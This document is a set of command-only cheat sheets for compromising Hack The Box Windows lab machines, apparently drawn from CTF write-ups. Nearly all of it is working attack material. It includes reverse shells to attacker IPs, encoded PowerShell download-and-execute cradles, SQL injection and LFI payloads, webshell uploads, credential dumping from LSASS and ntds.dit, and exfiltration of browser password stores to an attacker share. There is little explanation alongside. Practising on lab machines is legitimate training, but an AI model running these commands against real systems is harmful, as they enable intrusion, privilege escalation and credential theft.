# Win-Active
https://0xdf.gitlab.io/2018/12/08/htb-active.html
```
enum4linux 10.10.10.100
smbclient \\\\10.10.10.100\\Replication
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D SVC_TGS -w GPPstillStandingStrong2k18 > ldapsearch.txt
./GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100 –request
john hash_admin -w=/usr/share/wordlists/rockyou.txt
./wmiexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
./psexec.py Administrator:Ticketmaster1968@10.10.10.100
```


# Win-Blackfield
```
nmap -sS -sC -sV -T5 -Pn 10.10.10.192
nmap -sU -T5 10.10.10.192
smbclient -L \\\\10.10.10.192\\
smbclient \\\\10.10.10.192\\profiles$
RECURSE ON
PROMPT OFF
mget *
ls -la | awk -F' ' '{print $9}' > users2.txt
./kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d BLACKFIELD.local /home/itsec/Documents/HTB-Blackfield/users2.txt
crackmapexec smb 10.10.10.192 -u users1.txt -p /usr/share/wordlists/rockyou.txt
smbclient -L \\\\10.10.10.192\\ -U BLACKFIELD.local/audit2020@BLACKFIELD.local
./GetNPUsers.py blackfield.local/ -no-pass -usersfile users1.txt -dc-ip 10.10.10.192
john hash1 -w=/usr/share/wordlists/rockyou.txt
neo4j console
bloodhound
git clone https://github.com/dirkjanm/BloodHound.py.git
python3 bloodhound.py -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c All
Raw Query: MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p
rpcclient -U blackfield/support 10.10.10.192
setuserinfo audit2020 23 H@CKTHEB0X#
crackmapexec smb 10.10.10.192 -u audit2020 -p H@CKTHEB0X# --shares
smbclient \\\\10.10.10.192\\forensic -U BLACKFIELD.local/audit2020
mget *
pypykatz lsa minidump lsass.DMP
pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes2
pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users2
crackmapexec smb 10.10.10.192 -u users2 -H hashes2
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
whoami /priv
robocopy /b C:\Users\Administrator\Desktop\ C:\
git clone https://github.com/giuliano108/SeBackupPrivilege.git
cd C:\programdata
upload SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
cd C:\windows\system32\config
type netlogon.dns
Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns
type \programdata\netlogon.dns
Copy-FileSeBackupPrivilege \users\administrator\desktop\root.txt 0xdf.txt
Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
https://pentestlab.blog/tag/diskshadow/
unix2dos vss.dsh
upload vss.dsh c:\programdata\vss.dsh
diskshadow /s c:\programdata\vss.dsh
./smbserver.py s . -smb2support -username df -password df
net use \\10.10.14.13\s /u:df df
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.13\s\ntds.dit
Copy-FileSeBackupPrivilege z:\Windows\system32\config\SYSTEM \\10.10.14.6\s\SYSTEM
./secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```


# Win-Cerberus
```
nano /etc/hosts
http://icinga.cerberus.local:8080/icingaweb2/authentication/login
https://github.com/doosec101/CVE-2022-24716
python3 exploit.py -h
python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /etc/icingaweb2/resources.ini
http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
openssl genrsa -out private-key.pem 1024
Configuration – Application: Create a New Resource
../../../../../../../../../../../../dev/shm/test.txt
python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /dev/shm/test.txt
echo "sh -i >& /dev/tcp/10.10.14.2/10001 0>&1" | base64 -w 0
../../../../../dev/shm/training/configuration.php
Module path: /dev/shm/
Triger: Click Access Control
python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /dev/shm/training/configuration.php
python3 -c 'import pty; pty.spawn("/bin/bash")’
find / -perm -4000 2>/dev/null
firejail --version
https://www.openwall.com/lists/oss-security/2022/06/08/10/1
./firejoin.py
firejail --join=3089
su -
ifconfig
ps aux | grep root
cd /var/lib/sss/db
strings cache_cerberus.local.ldb | sort -u | head
john hash -w=/usr/share/wordlists/rockyou.txt
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.14.2 lport=10002 -f elf -o shell
use exploit/multi/handler
run -j
use auxiliary/server/socks_proxy
run -j
nano /etc/proxychains4.conf
wget http://10.10.14.2:8000/shell
./shell &
use post/multi/manage/autoroute
proxychains evil-winrm -i 172.16.22.1 -u matthew -p 147258369
netstat -ano | select-string LIST
cat /etc/hosts
git clone https://github.com/jpillora/chisel.git
./chisel_1.9.0_linux_amd64 server --socks5 -p 6666 --reverse
iwr('http://10.10.14.2:8000/chisel_1.9.0_windows_amd64') -outfile chisel.exe
start-process -filepath .\chisel.exe -args "client 10.10.14.2:6666 R:8888:socks"
nano /etc/proxychains4.conf
New SOCKS proxy
https://dc.cerberus.local:9251
wget https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966.rb
cd "C:\program files (x86)\manageengine\ADSelfService Plus\backup“
download OfflineBackup_20230214064809.ezip
7z x OfflineBackup_20230214064809.ezip
grep -i issuer_url *
```


# Win-Conceal
https://0xdf.gitlab.io/2019/05/18/htb-conceal.html
```
nmap -sU 10.10.10.116
https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting
ike-scan -M 10.10.10.116
snmpwalk -v2c -c public 10.10.10.116
https://crackstation.net/
ipsec up conceal
nmap -sT -p- 10.10.10.116
ftp 10.10.10.116 : anonymous
put cmd.asp
http://10.10.10.116/upload/cmd.asp?cmd=whoami
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
http://10.10.10.116/upload/cmd.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.7/Invoke-PowerShellTcp.ps1%27)
SeImpresonatePrivilege : JuicyPotato
https://0xdf.gitlab.io/2019/05/18/htb-conceal.html
```


# Win-Flight
```
nmap -sS -sC -sV -T5 -Pn 10.10.11.187
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.187/FUZZ -fs 301 -e .aspx,.php,.txt,.html,.sh
http://10.10.11.187/js/
http://10.10.11.187/webalizer
smbclient -L \\\\10.10.11.187\\
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://flight.htb/ -H "Host: FUZZ.flight.htb" -fs 7069 -fw 22
http://school.flight.htb/
http://school.flight.htb/index.php?view=home.html
http://school.flight.htb/index.php?view=C:\Windows\System32\drivers\etc\hosts
http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
responder -I tun0 -v
http://school.flight.htb/index.php?view=//10.10.14.10/htb
john hash -w=/usr/share/wordlists/rockyou.txt
crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13'
smbclient -L \\\\10.10.11.187\\ -U flight.htb/svc_apache
smbclient \\\\10.10.11.187\\Users -U flight.htb/svc_apache
ldapdomaindump -u flight\\svc_apache -p 'S@Ss!K@*t13' 10.10.11.187
cat domain_users.grep | grep "Domain Users" | awk -F' ' '{print $1}'
crackmapexec smb 10.10.11.187 -u users_all2 -p 'S@Ss!K@*t13'
smbclient \\\\10.10.11.187\\Users -U flight.htb/S.Moon
responder -I tun0 -v
git clone https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft
python3 ntlm_theft.py --generate all --server 10.10.14.67 --filename htb
impacket-smbclient s.moon:'S@Ss!K@*t13'@flight.htb
use Shared
put htb/htb.scf
put htb/desktop.ini
john hash2 -w=/usr/share/wordlists/rockyou.txt
smbmap -H flight.htb -u 'c.bum' -p 'Tikkycoll_431012284’
smbclient \\\\10.10.11.187\\Users -U flight.htb/c.bum
shell.php
impacket-smbclient c.bum:'Tikkycoll_431012284'@flight.htb
use Web
cd flight.htb
put shell.php
curl 'http://flight.htb/shell.php?c=whoami'
curl https://sliver.sh/install|sudo bash
sliver
service sliver start
generate --os windows --arch 64bit --mtls 10.10.14.10 --reconnect 60 --save htb.exe
mtls
sudo python3 -m http.server 80
curl 'http://flight.htb/shell.php?c=powershell%20-c%20%22wget%2010.10.14.10%2Fhtb.exe%20-usebasicparsing%20-outfile%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe%3B%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe’
powershell -c "wget 10.10.14.67/htb.exe -usebasiparsing -outfile C:\users\public\music\htb.exe; C:\users\public\music\htb.exe
sessions -i ce7
whoami
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
upload RunasCs.exe
shell
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.10:443 cmd
rlwrap -cAr nc -lnvp 443
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
cd C:\ProgramData
powershell -c wget 10.10.14.10/chisel_1.9.1_windows_amd64 -outfile c.exe
./chisel_1.9.1_linux_amd64 server -p 8000 --reverse
.\c.exe client 10.10.14.10:8000 R:8001:127.0.0.1:8000
http://127.0.0.1:8001/
[Open another terminal]
OR
powershell -c wget 10.10.14.10/RunasCs.exe -outfile RunasCs.exe
rlwrap -cAr nc -lnvp 443
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.10:443 cmd
whoami /all
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
cd C:\inetpub\development
powershell -c wget 10.10.14.10/cmd.aspx -outfile cmd.aspx
http://127.0.0.1:8001/cmd.aspx
wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
cd C:\ProgramData
powershell -c wget 10.10.14.10/nc64.exe -outfile nc64.exe
cd C:\inetpub\development
powershell -c wget 10.10.14.10/cmd.aspx -outfile cmd.aspx
http://127.0.0.1:8001/cmd.aspx
/c \ProgramData\nc64.exe -e cmd 10.10.14.10 443
rlwrap -cAr nc -lnvp 443
wget https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/Rubeus.exe
cd C:\ProgramData
powershell -c wget 10.10.14.10/Rubeus.exe -outfile Rubeus.exe
.\rubeus.exe tgtdeleg /nowrap
cat ticket.b64 | base64 -d > ticket2.kirbi
impacket-ticketConverter ./ticket3.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
sudo service virtualbox-guest-utils stop
sudo ntpdate -s 10.10.11.187
10.10.11.187 g0.flight.htb
./secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator
impacket-psexec administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
type ..\..\Users\Administrator\Desktop\root.txt
```


# Win-Forest
https://0xdf.gitlab.io/2020/03/21/htb-forest.html
```
ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 > ldapsearch.txt
enum4linux 10.10.10.161
./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/’
john hashsvc -w=/usr/share/wordlists/rockyou.txt
crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
iex(new-object net.webclient).downloadstring("http://10.10.14.13/SharpHound.ps1")
invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
./smbserver.py share . -smb2support -username df -password df
CanPSRemote
iex(new-object net.webclient).downloadstring("http://10.10.14.13/PowerView.ps1")
./secretsdump.py svc-alfresco:s3rvice@10.10.10.161
./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```


# Win-Intelligence
```
nmap -sS -sC -sV -T5 -Pn 10.10.10.248
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.248/FUZZ -e .aspx,.php,.txt,.html,.sh
wget http://10.10.10.248/documents/2020-01-01-upload.pdf
exiftool 2020-01-01-upload.pdf
curl http://10.10.10.248/documents/2020-01-01-upload.pdf --output 2020-01-01-upload.pdf
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
./kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb users
python3 findpdfs.py
wget -i pdfsurl
exiftool *upload.pdf | grep Creator | sort –u
exiftool *upload.pdf | grep Creator | awk -F': ' '{print $2}' | sort -u
for f in *pdf; do pdftotext $f; done
head -n1 *txt
NewIntelligenceCorpUser9876
cat *txt > all.txt
nano all.txt; ctrl+w password
crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876
smbclient -L \\\\10.10.10.248\\ -U intelligence.htb/Tiffany.Molina
smbclient \\\\10.10.10.248\\Users -U intelligence.htb/Tiffany.Molina
smbclient \\\\10.10.10.248\\IT -U intelligence.htb/Tiffany.Molina
https://github.com/dirkjanm/krbrelayx
./dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.14.20 -t A
responder -I tun0
john hash -w=/usr/share/wordlists/rockyou.txt
Ted.Graves | Mr.Teddy
sudo apt install bloodhound
neo4j console
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python3 setup.py install
python3 bloodhound.py -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c All
Mark User as owned; Shortest Paths to Domain Admins from Owned Principals
git clone https://github.com/micahvandeusen/gMSADumper
python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248
echo "10.10.10.248 intelligence.htb" | sudo tee -a /etc/hosts
sudo service virtualbox-guest-utils stop
sudo apt install ntpdate
sudo ntpdate -s 10.10.10.248
./getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :51e4932f13712047027300f869d07ab6
export KRB5CCNAME=Administrator.ccache
./wmiexec.py -k -no-pass dc.intelligence.htb
```


# Win-Jerry
```
nmap -p- -T5 10.10.10.95
http://10.10.10.95:8080/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.95:8080/manager/FUZZ -e .aspx,.php,.txt,.html,.sh
http://10.10.10.95:8080/manager/html
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=80 -f war -o revshell.war
nc -nlvp 80
http://10.10.10.95:8080/revshell/
```


# Win-Search
https://0xdf.gitlab.io/2022/04/30/htb-search.html
```
smbclient \\\\10.10.11.129\\RedirectedFolders$ -U search.htb/hope.sharp
ldapdomaindump -u search\\hope.sharp -p IsolationIsKey? 10.10.11.129
./GetUserSPNs.py search.htb/hope.sharp -dc-ip 10.10.11.129 -request
john hash-web_svc -w=/usr/share/wordlists/rockyou.txt
grep "HelpDesk User" domain_users.grep | awk -F'\t' '{print $3}'
crackmapexec smb 10.10.11.129 -u user_opt.txt -p @3ONEmillionbaby
sheetProtection
pfx2john staff.pfx > pfx_hash
./SharpHound.exe
./smbserver.py share . -smb2support -username df -password df
./BloodHound
Read GMSA Password
./wmiexec.py 'search/tristan.davies:0xdf0xdf!!!@10.10.11.129'
```


# Win-ServMon
```
nmap -sS -sC -sV -T5 -Pn 10.10.10.184
ftp 10.10.10.184
anonymous:anonymous
http://10.10.10.184
nvms 1000 exploit
https://www.exploit-db.com/exploits/48311
http://10.10.10.184/Pages/login.htm
/../../../../../../../../../../../../windows/win.ini
/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt
hydra -v -V -u -L users.txt -P passwords.txt -t 10 -u 10.10.10.184 ssh
ssh Nadine@10.10.10.184
Powershell
whoami /priv
searchsploit 'NSClient++'
cmd /c "C:\Program Files\NSClient++\nscp.exe" --version
https://www.exploit-db.com/exploits/46802
cd "C:\Program Files\NSClient++\“
sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
https://127.0.0.1:8443
\programdata\nc.exe 10.10.14.7 443 -e cmd
cd C:\programdata\
powershell wget http://10.10.14.7/nc64.exe -outfile nc.exe
powershell wget http://10.10.14.7/shell.bat -outfile shell.bat
/settings/external scripts/scripts/df
Command
C:\programdata\shell.bat
/settings/scheduler/schedules/df_run
Interval ; 10s
Command ; df
rlwrap nc -lnvp 443
Trigger with Module - CheckExternalScripts
```


# Win-Sniper
```
http://10.10.10.151/user/login.php
http://10.10.10.151/user/login.php
http://10.10.10.151/blog/?lang=blog-en.php
http://10.10.10.151/blog/?lang=/windows/win.ini
curl -X GET http://10.10.10.151/blog/?lang=/windows/win.ini
register: sahrul / sahrul
curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
<?=`powershell whoami`?> / pass123
curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
echo "wget http://10.10.14.2/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t UTF-16LE | base64
<?=`powershell /enc dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAG4AYwAuAGUAeABlACAALQBvACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAACgBjAC4AZQB4AGUACgA=`?>
curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
echo "C:\Windows\TEMP\nc.exe -e cmd.exe 10.10.14.2 4444" | iconv -t UTF-16LE | base64
<?=`powershell /enc QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAACgBjAC4AZQB4AGUAIAAtAGUAIABjAG0AZAAuAGUAeABlACAAMQAwAC4AMQAwAC4AMQA0AC4AMgAgADQANAA0ADQACgA=`?>
curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
more C:\inetpub\wwwroot\user\db.php
$password = convertto-securestring -AsPlainText -Force -String
"36mEAhz/B8xQ~2VM";
$credential = new-object -typename System.Management.Automation.PSCredential -
argumentlist "SNIPER\chris",$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { wget
http://10.10.14.23/nc.exe -o C:\Users\chris\nc.exe } -credential $credential;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e
cmd.exe 10.10.14.23 4444} -credential $credential;
wget http://10.10.14.23/instructions.chm -o C:\Users\chris\instructions.chm
hashcat -m 5600 --force hash.txt rockyou.txt
$password = convertto-securestring -AsPlainText -Force -String "butterfly!#1";
$credential = new-object -typename System.Management.Automation.PSCredential -
argumentlist "SNIPER\Administrator",$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e
cmd.exe 10.10.14.23 5555} -credential $credential;
```


# Win-StreamIO
https://0xdf.gitlab.io/2022/09/17/htb-streamio.html
```
http://watch.streamio.htb/
https://streamio.htb/
https://watch.streamio.htb/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -e .aspx,.php,.txt,.html,.sh
https://watch.streamio.htb/search.php
https://book.hacktricks.xyz/pentesting-web/sql-injection
1' and 1=1 -- | 1' and 1=2 --
10' union select 1,2,3,4,5,6 -- -
10' union select 1,@@version,3,4,5,6 -- -
10' union select 1,(select DB_NAME()),3,4,5,6 -- -
10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
https://crackstation.net/
https://streamio.htb/login.php
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -fs 1678
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/FUZZ' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -e .php
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
echo "PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpL[SNIIIIIP]Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==" | base64 -d > master.php
system("dir C:\\");
https://streamio.htb/admin/?debug=master.php
Content-Type: application/x-www-form-urlencoded
include=http://10.10.14.39/rce.php
rlwrap -cAr nc -lnvp 443
$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h’);
dir -recurse *.php | select-string -pattern "database"
where.exe sqlcmd
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;“
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
hashcat user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user
crackmapexec smb 10.10.11.158 -u users2.txt -p pass2.txt --continue-on-success --no-bruteforce
crackmapexec winrm 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
Get-ComputerInfo
upload winPEASx64.exe
./winPEASx64.exe
./smbserver.py s . -smb2support -username df -password df
cd C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release
net use \\10.10.14.39\s /u:df df
copy key4.db \\10.10.14.39\s\key4.db
copy logins.json \\10.10.14.39\s\logins.json
git clone https://github.com/lclevy/firepwd.git
python3 firepwd.py
crackmapexec smb 10.10.11.158 -u users3.txt -p pass3.txt
crackmapexec winrm 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python3 setup.py install
python3 bloodhound.py -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -gc dc.streamio.htb -ns 10.10.11.158 -c all --zip
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
upload PowerView.ps1
. .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText –Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
net group 'CORE STAFF'
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
crackmapexec smb 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
crackmapexec winrm 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
evil-winrm -i 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
```


# Win-Support
```
smbclient -L \\\\10.10.11.174\\
smbclient \\\\10.10.11.174\\support-tools
unzip UserInfo.exe.zip
cat UserInfo.exe.config
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
unzip Linux.x64.Release.zip
unzip ILSpy-linux-x64-Release.zip
cd artifacts/linux-arm64
sudo ./ILSpy
decrypt.py
wget https://dlcdn.apache.org/directory/studio/2.0.0.v20210717-M17/ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
tar -xf ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
./ApacheDirectoryStudio
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
Get-ADDomain
echo '10.10.11.174 dc.support.htb' | sudo tee -a /etc/hosts
whoami /groups
sudo neo4j start
/opt/BloodHound/BloodHound-linux-x64 ./BloodHound --no-sandbox
upload SharpHound.exe
./SharpHound.exe
download 20240514001541_BloodHound.zip
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
upload PowerView.ps1
. ./PowerView.ps1
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
git clone https://github.com/Kevin-Robertson/Powermad.git
upload Powermad.ps1
. ./Powermad.ps1
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
Get-ADComputer -identity FAKE-COMP01
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
upload Rubeus.exe
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
https://www.browserling.com/tools/remove-all-whitespace
base64 -d ticket.kirbi.b64 > ticket.kirbi
locate ticketConverter.py
./ticketConverter.py ticket.kirbi ticket.ccache
locate psexec.py
KRB5CCNAME=ticket.ccache ./psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```


# Win-Timelapse
```
smbclient -L \\\\10.10.11.152\\
smbclient \\\\10.10.11.152\\Shares
zip2john winrm_backup.zip > hash_zip
john hash_zip -w=/usr/share/wordlists/rockyou.txt
pfx2john legacyy_dev_auth.pfx > hash_pfx
john hash_pfx -w=/usr/share/wordlists/rockyou.txt
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
net user svc_deploy
upload AdmPwd.PS
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
evil-winrm -i 10.10.11.152 -S -u administrator -p 'A+@PQh;Cj0+{Cb2oBJBybYry'
```
